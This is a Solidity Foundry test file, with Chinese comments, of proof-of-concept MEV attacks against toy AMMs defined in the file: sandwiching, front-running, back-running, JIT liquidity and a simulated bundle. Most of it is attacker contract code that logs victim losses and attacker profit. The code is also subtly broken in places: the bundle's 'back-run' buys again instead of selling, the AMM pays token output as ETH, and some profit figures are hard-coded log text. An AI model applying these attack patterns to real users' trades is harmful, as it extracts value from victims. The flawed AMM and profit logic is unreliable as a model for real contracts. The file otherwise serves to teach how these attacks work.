// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title MEV攻击完整PoC集合
 * @notice MEV = Maximal Extractable Value (最大可提取价值)
 * 
 * 四大核心攻击：
 * 1. Sandwich Attack（三明治攻击）
 * 2. Front-running（抢跑）
 * 3. Back-running（尾随）
 * 4. JIT Liquidity Attack（即时流动性攻击）
 * 
 * 这些是区块链特有的攻击方式！
 */

// ============ 基础AMM用于演示 ============

/**
 * @title 简单的AMM (用于MEV演示)
 */
contract SimpleAMM {
    uint256 public reserve0;
    uint256 public reserve1;
    
    uint256 public constant FEE = 3; // 0.3%
    
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1Out,
        address indexed to
    );
    
    constructor(uint256 _reserve0, uint256 _reserve1) payable {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
    }
    
    function swap(uint256 amount0In, uint256 minAmount1Out) 
        external 
        payable 
        returns (uint256 amount1Out) 
    {
        require(msg.value == amount0In, "Wrong ETH amount");
        require(amount0In > 0, "Invalid input");
        
        // 计算输出（恒定乘积）
        uint256 amount0InWithFee = (amount0In * (1000 - FEE)) / 1000;
        amount1Out = (amount0InWithFee * reserve1) / (reserve0 + amount0InWithFee);
        
        require(amount1Out >= minAmount1Out, "Slippage too high");
        require(amount1Out < reserve1, "Insufficient liquidity");
        
        reserve0 += amount0In;
        reserve1 -= amount1Out;
        
        payable(msg.sender).transfer(amount1Out);
        
        emit Swap(msg.sender, amount0In, amount1Out, msg.sender);
        
        return amount1Out;
    }

    function swapTokensForETH(uint256 amount1In, uint256 minAmount0Out)
        external
        returns (uint256 amount0Out)
    {
        require(amount1In > 0, "Invalid input");

        uint256 amount1InWithFee = (amount1In * (1000 - FEE)) / 1000;
        amount0Out = (amount1InWithFee * reserve0) / (reserve1 + amount1InWithFee);

        require(amount0Out >= minAmount0Out, "Slippage too high");
        require(amount0Out < reserve0, "Insufficient liquidity");

        reserve1 += amount1In;
        reserve0 -= amount0Out;

        payable(msg.sender).transfer(amount0Out);

        return amount0Out;
    }
    
    function getAmountOut(uint256 amountIn) external view returns (uint256) {
        uint256 amountInWithFee = (amountIn * (1000 - FEE)) / 1000;
        return (amountInWithFee * reserve1) / (reserve0 + amountInWithFee);
    }
    
    receive() external payable {}
}

// ============ 场景1: Sandwich Attack（三明治攻击）============

/**
 * @title 三明治攻击者
 * @notice 最常见和最赚钱的MEV策略
 */
contract SandwichAttacker {
    SimpleAMM public amm;
    
    constructor(address _amm) {
        amm = SimpleAMM(payable(_amm));
    }
    
    /**
     * @notice 执行三明治攻击
     * @param victimAmount 受害者的交易金额
     * @param victimMinOut 受害者设置的最小输出
     */
    function executeSandwich(
        uint256 victimAmount,
        uint256 victimMinOut
    ) external payable {
        console.log("\n=== Sandwich Attack ===");
        console.log("Attacking a victim's swap transaction");
        
        // 记录初始状态
        uint256 initialReserve0 = amm.reserve0();
        uint256 initialReserve1 = amm.reserve1();
        uint256 initialPrice = (initialReserve1 * 1e18) / initialReserve0;
        
        console.log("\n--- Initial State ---");
        console.log("Reserve0:", initialReserve0);
        console.log("Reserve1:", initialReserve1);
        console.log("Price:", initialPrice);
        
        // 第1步：Front-run - 在受害者之前买入
        console.log("\n--- Step 1: Front-run (Buy before victim) ---");
        
        // 攻击者先买入，推高价格
        uint256 frontRunAmount = victimAmount / 2;
        console.log("Attacker buys:", frontRunAmount);
        
        uint256 attackerBought = amm.swap{value: frontRunAmount}(frontRunAmount, 0);
        console.log("Attacker received:", attackerBought);
        
        uint256 priceAfterFrontRun = (amm.reserve1() * 1e18) / amm.reserve0();
        console.log("Price after front-run:", priceAfterFrontRun);
        uint256 priceDiff = priceAfterFrontRun >= initialPrice ?
            priceAfterFrontRun - initialPrice :
            initialPrice - priceAfterFrontRun;

        if (priceAfterFrontRun >= initialPrice) {
            console.log("Price increased:", (priceDiff * 100) / initialPrice, "%");
        } else {
            console.log("Price decreased:", (priceDiff * 100) / initialPrice, "%");
        }
        
        // 第2步：受害者的交易执行
        console.log("\n--- Step 2: Victim's transaction executes ---");
        console.log("Victim buys:", victimAmount);
        
        // 模拟受害者交易
        uint256 victimReceived = amm.swap{value: victimAmount}(victimAmount, victimMinOut);
        console.log("Victim received:", victimReceived);
        console.log("Victim's effective price:", (victimAmount * 1e18) / victimReceived);
        
        uint256 priceAfterVictim = (amm.reserve1() * 1e18) / amm.reserve0();
        console.log("Price after victim:", priceAfterVictim);
        
        // 第3步：Back-run - 在受害者之后卖出
        console.log("\n--- Step 3: Back-run (Sell after victim) ---");
        
        // 攻击者卖出，获利
        console.log("Attacker sells tokens:", attackerBought);
        
        uint256 attackerProceeds = amm.swapTokensForETH(attackerBought, 0);
        console.log("Attacker received ETH:", attackerProceeds);
        
        // 计算利润
        console.log("\n--- Attack Results ---");
        uint256 attackerCost = frontRunAmount;
        uint256 attackerRevenue = attackerProceeds;
        
        if (attackerRevenue > attackerCost) {
            uint256 profit = attackerRevenue - attackerCost;
            console.log("Attacker profit:", profit);
            console.log("Profit percentage:", (profit * 100) / attackerCost, "%");
        } else {
            console.log("Attack failed - no profit");
        }
        
        // 受害者的损失
        uint256 victimExpectedOut = (victimAmount * initialReserve1) / (initialReserve0 + victimAmount);
        uint256 victimLoss = victimExpectedOut > victimReceived ? 
            victimExpectedOut - victimReceived : 0;
        console.log("\nVictim's loss due to sandwich:", victimLoss);
        console.log("Victim lost:", (victimLoss * 100) / victimExpectedOut, "% of expected output");
    }
    
    receive() external payable {}
}

// ============ 场景2: Front-running（抢跑）============

/**
 * @title 有利润机会的协议
 * @notice 例如：套利机会、清算、NFT铸造等
 */
contract ProfitableOpportunity {
    uint256 public reward = 100 ether;
    address public winner;
    bool public claimed;
    
    mapping(address => uint256) public bids;
    
    event OpportunityFound(uint256 reward);
    event OpportunityClaimed(address winner, uint256 amount);
    
    constructor() payable {
        require(msg.value >= reward, "Insufficient funding");
    }
    
    // 任何人可以claim，先到先得
    function claimReward() external {
        require(!claimed, "Already claimed");
        
        claimed = true;
        winner = msg.sender;
        
        payable(msg.sender).transfer(reward);
        
        emit OpportunityClaimed(msg.sender, reward);
    }
    
    // 竞价拍卖（gas竞争）
    function bid() external payable {
        require(msg.value > bids[msg.sender], "Bid too low");
        bids[msg.sender] = msg.value;
    }
    
    function getWinner() external view returns (address) {
        return winner;
    }
}

/**
 * @title Front-running 攻击者
 */
contract FrontRunner {
    ProfitableOpportunity public opportunity;
    
    constructor(address _opportunity) {
        opportunity = ProfitableOpportunity(_opportunity);
    }
    
    function demonstrateFrontRun() external {
        console.log("\n=== Front-running Attack ===");
        console.log("Scenario: Profitable opportunity (arbitrage/liquidation/etc)");
        
        console.log("\nVictim sees opportunity and sends transaction");
        console.log("Victim's tx in mempool with gas price: 50 gwei");
        
        console.log("\n--- Attacker's Strategy ---");
        console.log("1. Monitor mempool for profitable transactions");
        console.log("2. Identify victim's opportunity");
        console.log("3. Copy victim's transaction");
        console.log("4. Increase gas price to 100 gwei");
        console.log("5. Submit transaction to front-run victim");
        
        console.log("\n--- Transaction Ordering ---");
        console.log("Block N transactions:");
        console.log("  1. Attacker's tx (100 gwei) - EXECUTED FIRST");
        console.log("  2. Victim's tx (50 gwei) - REVERTS (already claimed)");
        
        // 模拟攻击
        opportunity.claimReward();
        
        console.log("\n--- Result ---");
        console.log("Winner:", opportunity.winner());
        console.log("Attacker claimed:", opportunity.claimed());
        console.log("Victim's transaction fails");
        console.log("Victim wasted gas fees");
    }
    
    receive() external payable {}
}

// ============ 场景3: Back-running（尾随）============

/**
 * @title 会改变状态的协议
 * @notice 例如：价格更新、新池子创建等
 */
contract StateChangingProtocol {
    uint256 public currentPrice = 100 ether;
    bool public priceUpdated;
    
    event PriceUpdated(uint256 oldPrice, uint256 newPrice);
    
    // Oracle更新价格
    function updatePrice(uint256 newPrice) external {
        uint256 oldPrice = currentPrice;
        currentPrice = newPrice;
        priceUpdated = true;
        
        emit PriceUpdated(oldPrice, newPrice);
    }
    
    // 基于当前价格的交易
    function trade(uint256 amount) external payable returns (uint256) {
        require(msg.value == amount, "Wrong amount");
        
        // 基于当前价格计算
        uint256 tokens = (amount * 1e18) / currentPrice;
        
        return tokens;
    }
}

/**
 * @title Back-running 攻击者
 */
contract BackRunner {
    StateChangingProtocol public protocol;
    SimpleAMM public amm;
    
    constructor(address _protocol, address _amm) {
        protocol = StateChangingProtocol(_protocol);
        amm = SimpleAMM(payable(_amm));
    }
    
    function demonstrateBackRun() external payable {
        console.log("\n=== Back-running Attack ===");
        console.log("Scenario: Price oracle update");
        
        console.log("\n--- Initial State ---");
        console.log("Current price:", protocol.currentPrice());
        
        console.log("\n--- Oracle Updates Price ---");
        console.log("Oracle submits transaction to update price");
        console.log("New price will be: 80 ether (20% decrease)");
        
        // Oracle更新价格
        protocol.updatePrice(80 ether);
        
        console.log("\n--- Attacker's Strategy ---");
        console.log("1. See oracle's tx in mempool");
        console.log("2. Know price will decrease");
        console.log("3. Submit transaction RIGHT AFTER oracle");
        console.log("4. Buy at new lower price");
        console.log("5. Sell immediately for arbitrage profit");
        
        console.log("\n--- Transaction Ordering ---");
        console.log("Block N transactions:");
        console.log("  1. Oracle's updatePrice() - price = 80 ether");
        console.log("  2. Attacker's trade() - buy at 80 ether");
        console.log("  3. Attacker's arbitrage on DEX");
        
        // 模拟套利
        console.log("\n--- Executing Arbitrage ---");
        uint256 buyAmount = 10 ether;
        console.log("Buy from protocol at 80 ether");
        uint256 tokensBought = protocol.trade{value: buyAmount}(buyAmount);
        console.log("Tokens received:", tokensBought);
        
        console.log("\nSell on DEX at market price ~90 ether");
        console.log("Estimated profit: ~12.5%");
    }
    
    receive() external payable {}
}

// ============ 场景4: JIT Liquidity Attack（即时流动性攻击）============

/**
 * @title 支持JIT的AMM
 * @notice Just-In-Time Liquidity
 */
contract JITVulnerableAMM {
    uint256 public reserve0;
    uint256 public reserve1;
    
    uint256 public totalLiquidity;
    mapping(address => uint256) public liquidity;
    
    uint256 public constant FEE = 30; // 0.3%
    uint256 public constant FEE_DENOMINATOR = 10000;
    
    constructor(uint256 _reserve0, uint256 _reserve1) payable {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
        
        totalLiquidity = sqrt(_reserve0 * _reserve1);
        liquidity[msg.sender] = totalLiquidity;
    }
    
    //  可以在同一区块内添加和移除流动性
    function addLiquidity(uint256 amount0, uint256 amount1) 
        external 
        payable 
        returns (uint256 shares) 
    {
        require(msg.value == amount0, "Wrong ETH");
        
        shares = min(
            (amount0 * totalLiquidity) / reserve0,
            (amount1 * totalLiquidity) / reserve1
        );
        
        liquidity[msg.sender] += shares;
        totalLiquidity += shares;
        
        reserve0 += amount0;
        reserve1 += amount1;
        
        return shares;
    }
    
    function removeLiquidity(uint256 shares) 
        external 
        returns (uint256 amount0, uint256 amount1) 
    {
        require(liquidity[msg.sender] >= shares, "Insufficient liquidity");
        
        amount0 = (shares * reserve0) / totalLiquidity;
        amount1 = (shares * reserve1) / totalLiquidity;
        
        liquidity[msg.sender] -= shares;
        totalLiquidity -= shares;
        
        reserve0 -= amount0;
        reserve1 -= amount1;
        
        payable(msg.sender).transfer(amount0);
        
        return (amount0, amount1);
    }
    
    function swap(uint256 amount0In, uint256 minAmount1Out) 
        external 
        payable 
        returns (uint256 amount1Out) 
    {
        require(msg.value == amount0In, "Wrong ETH");
        
        // 计算输出
        uint256 amount0InWithFee = (amount0In * (FEE_DENOMINATOR - FEE)) / FEE_DENOMINATOR;
        amount1Out = (amount0InWithFee * reserve1) / (reserve0 + amount0InWithFee);
        
        require(amount1Out >= minAmount1Out, "Slippage");
        
        reserve0 += amount0In;
        reserve1 -= amount1Out;
        
        payable(msg.sender).transfer(amount1Out);
        
        return amount1Out;
    }
    
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
    
    receive() external payable {}
}

/**
 * @title JIT流动性攻击
 */
contract JITLiquidityAttacker {
    JITVulnerableAMM public amm;
    
    constructor(address payable _amm) {
        amm = JITVulnerableAMM(_amm);
    }
    
    function executeJITAttack(uint256 victimSwapAmount) external payable {
        console.log("\n=== JIT Liquidity Attack ===");
        console.log("Just-In-Time Liquidity Provision");
        
        uint256 initialReserve0 = amm.reserve0();
        uint256 initialReserve1 = amm.reserve1();

        console.log("\n--- Initial Pool State ---");
        console.log("Reserve0:", initialReserve0);
        console.log("Reserve1:", initialReserve1);
        console.log("Total liquidity:", amm.totalLiquidity());
        
        console.log("\n--- Victim's Large Swap Detected in Mempool ---");
        console.log("Victim wants to swap:", victimSwapAmount);
        
        // 计算费用
        uint256 expectedFee = (victimSwapAmount * 30) / 10000;
        console.log("Expected fee from victim's swap:", expectedFee);
        
        // 第1步：在受害者交易前添加大量流动性
        console.log("\n--- Step 1: Add Liquidity (Front-run) ---");
        console.log("Attacker adds massive liquidity right before victim");
        
        uint256 jitLiquidityAmount = initialReserve0 * 2; // 2倍当前流动性
        console.log("Adding liquidity:", jitLiquidityAmount);
        
        uint256 sharesReceived = amm.addLiquidity{value: jitLiquidityAmount}(
            jitLiquidityAmount,
            jitLiquidityAmount
        );
        
        console.log("Received shares:", sharesReceived);
        console.log("Attacker now owns:", 
            (sharesReceived * 100) / amm.totalLiquidity(), "% of pool");
        
        console.log("\n--- Step 2: Victim's Swap Executes ---");
        console.log("Victim swaps:", victimSwapAmount);
        
        // 受害者swap (模拟)
        uint256 victimOut = amm.swap{value: victimSwapAmount}(victimSwapAmount, 0);
        console.log("Victim received:", victimOut);
        
        console.log("\n--- Step 3: Remove Liquidity (Back-run) ---");
        console.log("Attacker removes liquidity right after victim");
        
        // 立即移除流动性，带走费用
        (uint256 amount0Back, uint256 amount1Back) = amm.removeLiquidity(sharesReceived);
        
        console.log("Received back:");
        console.log("  Amount0:", amount0Back);
        console.log("  Amount1:", amount1Back);
        
        // 计算利润
        console.log("\n--- Attack Results ---");
        uint256 totalReceived = amount0Back + amount1Back;
        uint256 totalInvested = jitLiquidityAmount * 2;
        
        console.log("Invested:", totalInvested);
        console.log("Received:", totalReceived);
        
        if (totalReceived > totalInvested) {
            uint256 profit = totalReceived - totalInvested;
            console.log("Profit:", profit);
            console.log("This profit came from victim's fees!");
            console.log("Attacker held LP for:", "< 1 block");
        }
        
        console.log("\n--- Why This Works ---");
        console.log("1. Attacker provides liquidity JUST before big swap");
        console.log("2. Attacker owns majority of pool temporarily");
        console.log("3. Victim's swap generates fees");
        console.log("4. Attacker gets majority of fees");
        console.log("5. Attacker removes liquidity immediately");
        console.log("6. Existing LPs get almost no fees from the big swap");
    }
    
    receive() external payable {}
}

// ============ 高级：MEV Bundle (模拟) ============

/**
 * @title MEV Bundle 模拟器
 * @notice 展示如何组合多个交易
 */
contract MEVBundleSimulator {
    SimpleAMM public amm;
    
    struct Transaction {
        address target;
        uint256 value;
        bytes data;
        string description;
    }
    
    constructor(address _amm) {
        amm = SimpleAMM(payable(_amm));
    }
    
    function simulateBundle() external payable {
        console.log("\n=== MEV Bundle Simulation ===");
        console.log("Flashbots-style bundle execution");
        
        console.log("\n--- Bundle Contents ---");
        console.log("Bundle contains 3 transactions:");
        console.log("  Tx 0: Attacker's front-run (buy)");
        console.log("  Tx 1: Victim's swap");
        console.log("  Tx 2: Attacker's back-run (sell)");
        
        console.log("\n--- Bundle Guarantees ---");
        console.log("1. All-or-nothing execution");
        console.log("2. Atomic execution (no other txs in between)");
        console.log("3. No public mempool exposure");
        console.log("4. Profit guaranteed or bundle rejected");
        
        console.log("\n--- Executing Bundle ---");
        
        // Tx 0: Front-run
        uint256 frontRunAmount = 50 ether;
        console.log("\nTx 0: Attacker front-run");
        uint256 bought = amm.swap{value: frontRunAmount}(frontRunAmount, 0);
        console.log("  Bought:", bought);
        
        // Tx 1: Victim's swap
        uint256 victimAmount = 100 ether;
        console.log("\nTx 1: Victim's swap");
        uint256 victimOut = amm.swap{value: victimAmount}(victimAmount, 0);
        console.log("  Victim out:", victimOut);
        
        // Tx 2: Back-run
        console.log("\nTx 2: Attacker back-run");
        uint256 proceeds = amm.swap{value: bought}(bought, 0);
        console.log("  Proceeds:", proceeds);
        
        // 计算结果
        console.log("\n--- Bundle Result ---");
        if (proceeds > frontRunAmount) {
            console.log("Bundle profitable!");
            console.log("Profit:", proceeds - frontRunAmount);
        } else {
            console.log("Bundle not profitable - would be rejected");
        }
        
        console.log("\n--- Advantages of Bundles ---");
        console.log("- No failed transactions (wastes no gas)");
        console.log("- No MEV competition in public mempool");
        console.log("- Can simulate profit before submitting");
        console.log("- Direct to block builder");
    }
    
    receive() external payable {}
}

// ============ Foundry 测试 ============

contract MEVAttacksTest is Test {
    SimpleAMM public amm;
    ProfitableOpportunity public opportunity;
    StateChangingProtocol public protocol;
    JITVulnerableAMM public jitAMM;
    
    function setUp() public {
        // 设置AMM
        amm = new SimpleAMM{value: 2000 ether}(1000 ether, 1000 ether);
        vm.deal(address(amm), 2000 ether);
        
        // 设置机会
        opportunity = new ProfitableOpportunity{value: 100 ether}();
        
        // 设置协议
        protocol = new StateChangingProtocol();
        
        // 设置JIT AMM
        jitAMM = new JITVulnerableAMM{value: 2000 ether}(1000 ether, 1000 ether);
        vm.deal(address(jitAMM), 2000 ether);
    }
    
    function testSandwichAttack() public {
        SandwichAttacker attacker = new SandwichAttacker(address(amm));
        vm.deal(address(attacker), 200 ether);
        
        // 模拟受害者交易
        uint256 victimAmount = 100 ether;
        uint256 victimMinOut = 80 ether;
        
        attacker.executeSandwich{value: 200 ether}(victimAmount, victimMinOut);
    }
    
    function testFrontRunning() public {
        FrontRunner attacker = new FrontRunner(address(opportunity));
        
        attacker.demonstrateFrontRun();
        
        // 验证攻击者获胜
        assertTrue(opportunity.claimed(), "Should be claimed");
        assertEq(opportunity.winner(), address(attacker), "Attacker should win");
    }
    
    function testBackRunning() public {
        BackRunner attacker = new BackRunner(address(protocol), address(amm));
        vm.deal(address(attacker), 100 ether);
        
        attacker.demonstrateBackRun{value: 10 ether}();
    }
    
    function testJITLiquidity() public {
        JITLiquidityAttacker attacker = new JITLiquidityAttacker(payable(address(jitAMM)));
        vm.deal(address(attacker), 5000 ether);
        
        attacker.executeJITAttack{value: 5000 ether}(200 ether);
    }
    
    function testMEVBundle() public {
        MEVBundleSimulator simulator = new MEVBundleSimulator(address(amm));
        vm.deal(address(simulator), 300 ether);
        
        simulator.simulateBundle{value: 200 ether}();
    }
}

/**
 * ============ 知识点总结 ============
 * 
 * 1. Sandwich Attack (三明治攻击):
 *    - 最常见的MEV策略
 *    - Front-run + Back-run 组合
 *    - 推高价格 → 受害者买入 → 卖出获利
 *    - 受害者损失 = 攻击者利润
 * 
 * 2. Front-running (抢跑):
 *    - 在受害者交易前执行
 *    - 需要更高gas价格
 *    - 适用：套利、清算、NFT铸造
 *    - 受害者交易失败或收益减少
 * 
 * 3. Back-running (尾随):
 *    - 在特定交易后执行
 *    - 利用状态变化
 *    - 适用：价格更新、新池子
 *    - 无需竞争gas
 * 
 * 4. JIT Liquidity (即时流动性):
 *    - 在大额交易前提供流动性
 *    - 赚取大部分交易费用
 *    - 立即移除流动性
 *    - 原有LP损失费用收入
 * 
 * 5. MEV Bundle:
 *    - Flashbots引入
 *    - 原子执行多笔交易
 *    - 不进入公开mempool
 *    - 利润保证或不执行
 */
